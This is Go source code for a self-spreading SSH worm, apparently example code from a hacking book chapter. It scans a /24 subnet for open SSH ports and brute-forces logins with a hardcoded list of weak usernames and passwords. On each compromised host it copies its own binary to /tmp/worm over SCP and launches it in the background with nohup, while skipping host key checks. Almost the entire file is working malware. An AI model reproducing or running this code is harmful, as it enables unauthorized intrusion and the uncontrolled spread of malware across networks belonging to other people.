package main

import (
	"context"
	"fmt"
	"github.com/bramvdbogaerde/go-scp"
	"github.com/sechelper/seclib/async"
	"github.com/sechelper/seclib/network"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os"
	"strconv"
	"time"
)

const TIMEOUT = 2
const SSHPort = 22

type login struct {
	ip     string
	user   string
	passwd string
}

var passwds = []string{
	"kali",
	"123456",
	"12345678",
	"123",
	"root",
	"password",
	"sechelper",
}

var users = []string{
	"kali",
	"root",
}

// 扫描
func scan(segment string) []string {
	discover := func(ip string, port int) bool {
		address := ip + ":" + strconv.Itoa(port)
		conn, err := net.DialTimeout("tcp", address, TIMEOUT*time.Second)

		if err != nil {
			return false
		}
		defer conn.Close()
		return true
	}

	aliveAddr := make([]string, 0)
	_, ipv4NetSegment, err := network.ParseCIDR(segment)
	if err != nil {
		log.Println(err)
		return nil
	}

	input := func(ips *chan any) {
		for i := range ipv4NetSegment {
			*ips <- ipv4NetSegment[i].String()
		}
	}

	process := func(a ...any) {
		if discover(a[0].(string), SSHPort) {
			aliveAddr = append(aliveAddr, a[0].(string))
		}
	}

	async.Goroutine(100, input, process)

	return aliveAddr
}

// crack SSH 弱密码爆破
func crackSSH(ip string) login {
	done := make(chan struct{})
	success := login{}

	input := func(account *chan any) {
		for i := range users {
			for x := range passwds {
				select {
				case <-done:
					return
				default:
					*account <- login{ip: ip, user: users[i], passwd: passwds[x]}
				}
			}
		}
	}
	process := func(p ...any) {
		if _, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", p[0].(login).ip, SSHPort), &ssh.ClientConfig{
			Timeout:         TIMEOUT * time.Second,
			User:            p[0].(login).user,
			Auth:            []ssh.AuthMethod{ssh.Password(p[0].(login).passwd)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}); err != nil {
			//log.Println(err)
			return
		}

		success = p[0].(login)
		close(done)
	}

	async.Goroutine(10, input, process)
	return success
}

func spread(ip string, user string, passwd string) {
	// 建立SSH客户端连接
	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", ip, SSHPort), &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(passwd)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		log.Printf("SSH dial error: %s\n", err.Error())
		return
	}

	// Close client connection after the file has been copied
	defer client.Close()

	runCmd := func(cmd string) ([]byte, error) {
		// 建立新会话
		session, err := client.NewSession()
		if err != nil {
			log.Printf("new session error: %s", err.Error())
			return nil, err
		}

		defer session.Close()

		// 检查是否已被感染
		b, err := session.Output(cmd)
		if err != nil {
			log.Println(err)
			return nil, err
		}
		return b, nil
	}

	// 检查是否已传染，预防重复传染
	b, err := runCmd("FILE=/tmp/worm\nif [ -f \"$FILE\" ]; then\n    echo \"exist\"\nfi\n")

	if string(b) != "exist\n" {
		// 复制蠕虫自身
		scpSession, err := scp.NewClientBySSH(client)
		if err != nil {
			log.Println("Error creating new SSH session from existing connection", err)
			return
		}
		f, _ := os.Open("/Users/cookun/books/go-hacker-book/chapter 3/code/worm/worm")

		// Close the file after it has been copied
		defer f.Close()
		// the context can be adjusted to provide time-outs or inherit from other contexts if this is embedded in a larger application.
		err = scpSession.CopyFromFile(context.Background(), *f, "/tmp/worm", "0700")

		if err != nil {
			log.Println("Error while copying file ", err)
			return
		}

		// 运行蠕虫
		_, err = runCmd("nohup /tmp/worm >/dev/null 2>&1 &")
		if err != nil {
			log.Printf("SSH dial error: %s\n", err.Error())
			return
		}
	}

}

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// 探测存活主机
	aliveAddr := scan("192.168.2.1/24")

	// SSH弱密码爆破
	crackPass := func(success *chan any) {
		for i := range aliveAddr {
			result := crackSSH(aliveAddr[i])
			if result.ip != "" {
				*success <- result
			}
		}
	}

	// 蠕虫传播
	spreadWorm := func(args ...any) {
		login := (args[0]).(login)
		spread(login.ip, login.user, login.passwd)
	}

	async.Goroutine(5, crackPass, spreadWorm)

}
